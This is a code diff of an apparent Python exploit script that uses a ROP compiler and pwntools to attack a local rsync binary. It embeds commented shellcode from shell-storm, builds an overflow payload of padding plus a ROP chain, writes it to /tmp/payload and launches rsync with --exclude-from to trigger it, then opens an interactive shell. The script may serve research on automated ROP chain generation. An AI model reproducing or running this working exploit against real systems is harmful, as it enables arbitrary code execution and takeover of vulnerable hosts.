@@ -3,8 +3,6 @@ import archinfo
 from pwn import *
 from rop_compiler import ropme, goal
 
-filename = './rsync'
-files = [(filename, './rsync.gadgets', 0)]
 shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
     "\x48\x31\xd2"                                  # xor    %rdx, %rdx
  +  "\x48\x31\xc0"                                  # xor    %rax, %rax
@@ -19,14 +17,13 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
  +  "\x0f\x05"                                      # syscall
 )
 
-print "Finding gadgets and generating rop chain"
+filename = './rsync'
+files = [(filename, './rsync.gadgets', 0)]
 goals = [["shellcode_hex", binascii.hexlify(shellcode)]]
 rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals, archinfo.ArchAMD64(), logging.DEBUG)
 
 payload = ("A" * 5696) + "J"*8 + rop
+with open("/tmp/payload", "w") as f: f.write(payload)
 
-print "Starting rsync with the exploit payload"
 p = process(argv = [filename, '-r', '--exclude-from=/tmp/payload', '.', '/tmp/to/'], executable = filename)
-#gdb.attach(p, "set disassembly-flavor intel\nbreak *mprotect\n")
-
 p.interactive()
